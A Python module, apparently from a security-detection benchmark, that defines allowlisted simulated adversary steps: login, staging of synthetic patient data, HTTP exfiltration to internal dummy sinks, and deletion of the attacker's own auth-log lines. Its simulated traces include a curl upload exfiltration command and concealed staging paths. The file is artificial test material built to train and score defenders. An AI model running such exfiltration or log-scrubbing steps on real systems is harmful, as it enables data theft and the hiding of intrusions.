"""The adversary step library: the ONLY things the adversary can do (PLAN 8.3).

Every step is a fixed, deterministic mutation of the synthetic world with
allowlisted parameters. There is no shell, no code generation, no free-form
command, no regex, no URL and no host path supplied by a model. A plan is data:
a list of {step, params, delay_s}. Trusted orchestrator code validates it and
executes it; the answer key records what actually happened, not what was intended.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Any

from alibi.sim.world import AUTH_LOG, IPS, TraceRef, World

MAX_PLAN_STEPS = 8
MIN_DELAY_S = 20
MAX_DELAY_S = 600

# Synthetic objects that may be staged. Sizes are set per scenario.
DATASETS = ("patients_full", "immunization_registry")
STAGING_DIRS = ("/var/tmp/.pkg-cache", "/var/tmp/xfer", "/tmp/.font-unix", "/home/{account}/Downloads")
STAGING_NAME_RE = re.compile(r"^[a-z0-9][a-z0-9._-]{2,23}$")
DELETE_SELECTIONS = ("own_session_open", "own_session_all")
DELETE_HOSTS = ("workstation", "collector")
DELETE_FILES = (AUTH_LOG,)

LEVEL_STEPS: dict[str, tuple[str, ...]] = {
    "L1": ("login_as", "stage_copy", "exfil_http"),
    "L2": ("login_as", "stage_copy", "exfil_http", "delete_log_lines"),
}

# ATT&CK labels are explanatory metadata only; the scorer matches internal effect types.
ATTACK_META: dict[str, dict[str, str | None]] = {
    "login_as": {"attack_id": "T1078", "label": "Valid Accounts"},
    "stage_copy": {"attack_id": "T1074.001", "label": "Data Staged: Local Data Staging"},
    "exfil_http": {
        "attack_id": None,
        "label": "Transfer to a non-approved destination over HTTP (exfiltration mapping is context-dependent)",
    },
    # Verified 2026-11-14 against attack.mitre.org: the former T1070.002 now redirects to T1685.006.
    # Closest entry only: the simulated step removes selected lines, it does not clear a whole log.
    "delete_log_lines": {"attack_id": "T1685.006", "label": "Disable or Modify Tools: Clear Linux or Mac System Logs"},
}


class PlanError(ValueError):
    """A plan failed validation. The message is safe to show to a planning model."""


@dataclass
class PlanContext:
    """What a plan may refer to in this scenario (all synthetic, all allowlisted)."""

    level: str
    accounts: tuple[str, ...]  # accounts whose credentials are on the planted note
    sink_ips: tuple[str, ...]  # internal dummy destinations only
    dataset_sizes: dict[str, int]


def _require(cond: bool, msg: str) -> None:
    if not cond:
        raise PlanError(msg)


def validate_plan(plan: list[dict[str, Any]], ctx: PlanContext) -> list[dict[str, Any]]:
    """Validate structure, allowlists and precondition order. Returns a normalized copy."""
    _require(isinstance(plan, list) and plan, "plan must be a non-empty list of steps")
    _require(len(plan) <= MAX_PLAN_STEPS, f"plan has {len(plan)} steps; the maximum is {MAX_PLAN_STEPS}")
    allowed = LEVEL_STEPS.get(ctx.level)
    _require(allowed is not None, f"unknown difficulty level {ctx.level!r}")
    out: list[dict[str, Any]] = []
    logged_in_as: str | None = None
    staged: set[str] = set()
    for i, raw in enumerate(plan):
        where = f"step {i + 1}"
        _require(isinstance(raw, dict), f"{where}: must be an object")
        _require(set(raw) <= {"step", "params", "delay_s"}, f"{where}: unknown keys {sorted(set(raw) - {'step', 'params', 'delay_s'})}")
        name = raw.get("step")
        _require(name in allowed, f"{where}: step {name!r} is not allowed at {ctx.level}; allowed: {list(allowed)}")
        params = raw.get("params") or {}
        _require(isinstance(params, dict), f"{where}: params must be an object")
        delay = raw.get("delay_s", 60)
        _require(isinstance(delay, (int, float)) and not isinstance(delay, bool), f"{where}: delay_s must be a number")
        delay = int(delay)
        _require(MIN_DELAY_S <= delay <= MAX_DELAY_S, f"{where}: delay_s must be between {MIN_DELAY_S} and {MAX_DELAY_S}")

        if name == "login_as":
            _require(set(params) <= {"account"}, f"{where}: login_as takes only 'account'")
            _require(params.get("account") in ctx.accounts, f"{where}: account must be one of {list(ctx.accounts)}")
            _require(logged_in_as is None, f"{where}: already logged in")
            logged_in_as = params["account"]
        elif name == "stage_copy":
            _require(set(params) <= {"src", "dst_dir", "dst_name"}, f"{where}: stage_copy takes src, dst_dir, dst_name")
            _require(logged_in_as is not None, f"{where}: stage_copy requires a prior login_as")
            _require(params.get("src") in DATASETS and params.get("src") in ctx.dataset_sizes,
                     f"{where}: src must be one of {list(DATASETS)}")
            _require(params.get("dst_dir") in STAGING_DIRS, f"{where}: dst_dir must be one of {list(STAGING_DIRS)}")
            name_ok = isinstance(params.get("dst_name"), str) and STAGING_NAME_RE.match(params["dst_name"])
            _require(bool(name_ok), f"{where}: dst_name must match {STAGING_NAME_RE.pattern}")
            staged.add(staging_path(params["dst_dir"], params["dst_name"], logged_in_as))
        elif name == "exfil_http":
            _require(set(params) <= {"path", "dst"}, f"{where}: exfil_http takes path, dst")
            _require(logged_in_as is not None, f"{where}: exfil_http requires a prior login_as")
            _require(params.get("path") in staged, f"{where}: path must be a file staged earlier in this plan: {sorted(staged)}")
            _require(params.get("dst") in ctx.sink_ips, f"{where}: dst must be one of the internal sink addresses {list(ctx.sink_ips)}")
        elif name == "delete_log_lines":
            _require(set(params) <= {"host", "file", "event_selection"}, f"{where}: delete_log_lines takes host, file, event_selection")
            _require(logged_in_as is not None, f"{where}: delete_log_lines requires a prior login_as")
            _require(params.get("host") in DELETE_HOSTS, f"{where}: host must be one of {list(DELETE_HOSTS)}")
            _require(params.get("file") in DELETE_FILES, f"{where}: file must be one of {list(DELETE_FILES)}")
            _require(params.get("event_selection") in DELETE_SELECTIONS,
                     f"{where}: event_selection must be one of {list(DELETE_SELECTIONS)}")
        out.append({"step": name, "params": dict(params), "delay_s": delay})
    _require(out[0]["step"] == "login_as", "the first step must be login_as")
    return out


def staging_path(dst_dir: str, dst_name: str, account: str) -> str:
    return f"{dst_dir.replace('{account}', account)}/{dst_name}"


@dataclass
class StepResult:
    step: str
    params: dict[str, Any]
    t_start: datetime
    t_end: datetime
    status: str  # succeeded | failed | partial
    outcome: str
    host: str
    account_used: str | None = None
    affected_object: str | None = None
    affected_session: str | None = None
    artifacts_touched: list[str] = field(default_factory=list)
    effect_type: str | None = None
    effect_window: tuple[datetime, datetime] | None = None
    traces: list[TraceRef] = field(default_factory=list)


class StepExecutor:
    """Executes validated steps against the SimBackend world and reports real outcomes."""

    def __init__(self, world: World, ctx: PlanContext):
        self.world = world
        self.ctx = ctx
        self.session = None
        self.account: str | None = None
        self.staged: dict[str, int] = {}
        self.results: list[StepResult] = []

    def execute(self, step: dict[str, Any], t: datetime) -> StepResult:
        fn = getattr(self, f"_do_{step['step']}")
        res: StepResult = fn(t, **step["params"])
        self.results.append(res)
        return res

    # -- login_as -------------------------------------------------------------
    def _do_login_as(self, t: datetime, account: str) -> StepResult:
        w = self.world
        if w.console_busy_until is not None and t < w.console_busy_until:
            return StepResult("login_as", {"account": account}, t, t, "failed",
                              "console in use by another session", "workstation", account_used=account)
        sess, ref = w.open_session("workstation", account, t, origin="console", tty="tty1")
        self.session, self.account = sess, account
        return StepResult("login_as", {"account": account}, t, t + timedelta(seconds=2), "succeeded",
                          f"console session {sess.number} opened as {account}", "workstation",
                          account_used=account, affected_object="tty1", affected_session=sess.session_id,
                          artifacts_touched=[f"workstation:{AUTH_LOG}"], traces=[ref])

    # -- stage_copy -----------------------------------------------------------
    def _do_stage_copy(self, t: datetime, src: str, dst_dir: str, dst_name: str) -> StepResult:
        w = self.world
        params = {"src": src, "dst_dir": dst_dir, "dst_name": dst_name}
        if self.session is None or self.session.closed is not None:
            return StepResult("stage_copy", params, t, t, "failed", "no active session", "workstation")
        path = staging_path(dst_dir, dst_name, self.account or "")
        size = self.ctx.dataset_sizes[src]
        dur = max(3, int(size / 4_000_000))
        t_end = t + timedelta(seconds=dur)
        traces = [
            w.history("workstation", self.account, t, f"clinic-export --dataset {src} --out {path}"),
            w.log("records", "/var/log/records-app/access.log", t + timedelta(seconds=1), "records-app[880]",
                  f"user={self.account} client={IPS['workstation']} action=export_bulk dataset={src} bytes={size} status=200"),
            w.flow(t + timedelta(seconds=1), IPS["workstation"], IPS["records"], 443, 1400 + w.rng.randrange(0, 600), size + 2200, duration_s=dur),
            w.write_file("workstation", path, size, self.account, t_end),
        ]
        self.staged[path] = size
        return StepResult("stage_copy", params, t, t_end, "succeeded",
                          f"{src} ({size} bytes) written to {path}", "workstation", account_used=self.account,
                          affected_object=path, affected_session=self.session.session_id,
                          artifacts_touched=["workstation:fs_stat", "workstation:history", "records:/var/log/records-app/access.log", "tap:flows"],
                          effect_type="data_staging", effect_window=(t, t_end), traces=traces)

    # -- exfil_http -----------------------------------------------------------
    def _do_exfil_http(self, t: datetime, path: str, dst: str) -> StepResult:
        w = self.world
        params = {"path": path, "dst": dst}
        if self.session is None or self.session.closed is not None:
            return StepResult("exfil_http", params, t, t, "failed", "no active session", "workstation")
        if path not in self.staged:
            return StepResult("exfil_http", params, t, t, "failed", "source file does not exist", "workstation",
                              account_used=self.account, affected_session=self.session.session_id)
        size = self.staged[path]
        dur = max(4, int(size / 1_500_000))
        t_end = t + timedelta(seconds=dur)
        name = path.rsplit("/", 1)[-1]
        traces = [
            w.history("workstation", self.account, t, f"curl -s -T {path} http://{dst}:8080/u/{name}"),
            w.flow(t, IPS["workstation"], dst, 8080, size + 3100 + w.rng.randrange(0, 900), 380 + w.rng.randrange(0, 120), duration_s=dur),
        ]
        return StepResult("exfil_http", params, t, t_end, "succeeded",
                          f"{size} bytes sent from {path} to {dst}:8080", "workstation", account_used=self.account,
                          affected_object=f"{dst}:8080", affected_session=self.session.session_id,
                          artifacts_touched=["workstation:history", "tap:flows"],
                          effect_type="policy_violating_transfer", effect_window=(t, t_end), traces=traces)

    # -- delete_log_lines -----------------------------------------------------
    def _do_delete_log_lines(self, t: datetime, host: str, file: str, event_selection: str) -> StepResult:
        w = self.world
        params = {"host": host, "file": file, "event_selection": event_selection}
        sid = self.session.session_id if self.session else None
        if self.session is None or self.session.closed is not None:
            return StepResult("delete_log_lines", params, t, t, "failed", "no active session", host)
        if host != "workstation":
            # The collector is an independent witness: not writable from the workstation.
            return StepResult("delete_log_lines", params, t, t + timedelta(seconds=1), "failed",
                              f"permission denied: {host} is not writable from this session", host,
                              account_used=self.account, affected_object=file, affected_session=sid)
        lf = w.logs[(host, file)]
        marker = f"(session {self.session.number})"
        victims = [ln for ln in lf.current if marker in ln.text]
        if event_selection == "own_session_open":
            victims = [ln for ln in victims if "session opened" in ln.text]
        if not victims:
            return StepResult("delete_log_lines", params, t, t + timedelta(seconds=1), "failed",
                              "no matching lines present in the current local file", host,
                              account_used=self.account, affected_object=file, affected_session=sid)
        gone = {ln.uid for ln in victims}
        lf.current = [ln for ln in lf.current if ln.uid not in gone]
        traces: list[TraceRef] = []
        for ln in victims:
            traces.append(TraceRef(artifact_logical=f"{host}:{file}", raw=ln.text, ts=ln.ts, role="removed_local"))
            copy = w.collector_copy_of(host, file, ln.text)
            if copy is not None:
                traces.append(copy)
        window = (min(ln.ts for ln in victims), max(ln.ts for ln in victims))
        return StepResult("delete_log_lines", params, t, t + timedelta(seconds=2), "succeeded",
                          f"{len(victims)} line(s) removed from local {file}; collector copies untouched", host,
                          account_used=self.account, affected_object=file, affected_session=sid,
                          artifacts_touched=[f"{host}:{file}"], effect_type="local_log_removal",
                          effect_window=window, traces=traces)
